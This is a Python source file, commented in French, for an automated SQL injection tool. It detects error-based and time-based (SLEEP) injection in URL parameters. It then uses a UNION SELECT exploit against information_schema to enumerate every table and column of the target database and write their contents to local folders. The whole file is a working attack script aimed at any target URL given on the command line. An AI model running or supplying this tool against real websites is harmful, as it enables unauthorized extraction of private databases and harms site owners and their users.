import optparse
import requests
import re
import urllib
import urllib.parse
import urllib.request
from colorama import Fore
import sys
from bs4 import BeautifulSoup
import difflib 
import os

headers = {
    "User-Agent": "MonAgentUtilisateur/1.0",  
    "Accept-Language": "fr-FR"  
}                               

DBMS_ERRORS = {                                 
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

def _retrieve_content(url):
    try:
        response = urllib.request.urlopen(url)
        retval = response.read().decode('utf-8')
        return retval                        # RETVAL = return value = html
    except:
        print("Impossible de recuperer le code html")
        sys.exit(1)


def scan_page(url):
    original= None
    database = "Undefined"
    sqli = False
    vulnerable = False

    for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):  
        sqli = True
        print("*Vulnerable parameter :'%s'" % ( match.group("parameter")))
        original = _retrieve_content(url)  
        tampered = url + "\'\")("                 # URL avec generateur d'erreur
        content = _retrieve_content(tampered)     # html de page d'erreur
        print("Test for error message on",tampered)

        for dbms in DBMS_ERRORS:                    ##Cherche pour
            for regex in DBMS_ERRORS[dbms]:         ## un mot cle dans la page d'erreur
                if re.search(regex, content, re.I) and not re.search(regex, original, re.I) and vulnerable == False:
                    print(Fore.RED + f"Parameter '{match.group('parameter')}' appears to be **ERROR** SQLi vulnerable")
                    database = dbms
                    vulnerable=True
	
    if not sqli:
        print("No SQLi found :(");

    print()
    print(Fore.YELLOW+"Database type =", database)
    print()
    return database
	

def test_time_attack(url):
	for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):

		response = requests.get(url,headers=headers)
		response_time = response.elapsed.total_seconds()

		url_time_attack = url + urllib.parse.quote(" AND (SELECT SLEEP(3))") #calcule temps de rep avec time attack
		print(Fore.WHITE+"Test with time attack :" , url_time_attack)
		response = requests.get(url_time_attack, headers=headers)
		response_time2 = response.elapsed.total_seconds()

		if response_time + 2 < response_time2:
			 print(Fore.RED +"Parameter '%s' appears to be **TIME** SQLi vulnerable" % ( match.group("parameter")))
        

def open_url(url):
    response = requests.get(url)
    
    if response.status_code == 200:
        soup = BeautifulSoup(response.content, 'html.parser')
        contenu_visible = soup.get_text()
        return (contenu_visible)
    else:
        print("La requête a échoué avec le code de statut :", response.status_code)
        return(None)


def search_for_str(url,chaine_recherchee):
    
    if open_url(url).find(chaine_recherchee) is not -1:
        return(True)
    else:
        return(False)


def get_rep_explt(url,url_explt):
    
    basic = None
    raw_tables = None
    
    basic = open_url(url)
    raw_tables = open_url(url_explt)

    if basic == None :
        print("Last try for request")
        basic = open_url(url)
        if basic == None:
            print("Echec")
            sys.exit(1)

    if raw_tables == None :
        print("Last try for request")
        raw_tables = open_url(url)
        if raw_tables == None:
            print("Echec")
            sys.exit(1)

    output_list = [li for li in difflib.ndiff(basic, raw_tables) if li[0] != ' ']

    resultat = ''.join(x[2:] for x in output_list if x.startswith('+ '))
    return resultat


def get_all(basic, info,archives):

    url_4table_name = info.replace("'qpTn'", "database()")
    dossier = get_rep_explt(basic,url_4table_name)
    if archives != None:
        if not os.path.exists(archives):
            os.mkdir(archives)
        dossier = archives+"/"+dossier
    if os.path.exists(dossier):
        print(Fore.RED + "Dir '", dossier, "' already exist, delete it")
        sys.exit(1)
    os.mkdir(dossier)

    print(Fore.RED +"**UNION** exploit:")
    print(Fore.WHITE + "-> Payload =", basic)
    print()

    ext = "%20FROM%20information_schema.tables"

    url_4tables_explt = info.replace("'qpTn'", "group_concat(table_name)")+ ext

    resultat = get_rep_explt(basic,url_4tables_explt)

    tableau_table = resultat.split(',')

    for table in tableau_table:
        table_dir= dossier + '/' + table
        os.mkdir(table_dir)

        ext = "%20FROM%20information_schema.columns%20WHERE%20table_name="+'%27'+ table +'%27'
        url_4columns_explt = info.replace("'qpTn'", "group_concat(column_name)") + ext 
        resultat = get_rep_explt(basic,url_4columns_explt)
        tableau_columns = resultat.split(',')

        for columns in tableau_columns:
            replacement = 'group_concat('+columns+')'
            ext = '%20FROM%20' + table
            url_4file_explt = info.replace("'qpTn'",replacement) + ext
            content = get_rep_explt(basic,url_4file_explt)
            if columns is not None or columns is not '':
                file = table_dir+'/'+columns
                print(file)
                try:
                    with open(file,'w') as fichier:
                        fichier.write(content)
                except:
                    print("File empty")

        print("Scanning...")

    sys.exit(0)

def search_tables(url, archives):
    null = "%20NULL"
    virgule = ","
    iteration = 0


    for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):
        url_modifiee = re.sub(r"(\A|[?&])(?P<parameter>[^_]\w*)=([^&#]+)", r"\1\g<parameter>=" + "-626%20UNION%20SELECT%20NULL", url)
        error = _retrieve_content(url_modifiee)
        test_error = error

        while test_error == error:
            iteration += 1
            if iteration > 25:
                print("No exploit for get databases found")
                sys.exit(1)
            url_modifiee = url_modifiee +virgule+ null
            test_error =  _retrieve_content(url_modifiee)
        url_exploit=url_modifiee
        
        chaine = url_exploit
        motif = "NULL"
        remplacement = "'qpTn'"

        index = 0

        while True:
            index = chaine.find(motif, index)
            if index == -1:
                print("Error")
                break
            chaine = chaine[:index] + remplacement + chaine[index + len(motif):]
           
            if search_for_str(chaine,'qpTn'):
                get_all(url_exploit,chaine,archives)
                
            chaine = chaine[:index] + motif + chaine[index + len(remplacement):]
            index += len(remplacement)



if __name__ == "__main__":

    parser = optparse.OptionParser()
    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
    parser.add_option("-o",  dest="archive", help="Archive dir (e.g. \"./data"")")
    parser.add_option("-X", dest="request_type", help="Request type (e.g. \"POST\")")
    options, _ = parser.parse_args()

    print(Fore.WHITE+"*------------------------------------------------------------------------*")

    database=scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)
    test_time_attack(options.url)

    if database is not "Undefined":
        search_tables(options.url if options.url.startswith("http") else "http://%s" % options.url, options.archive )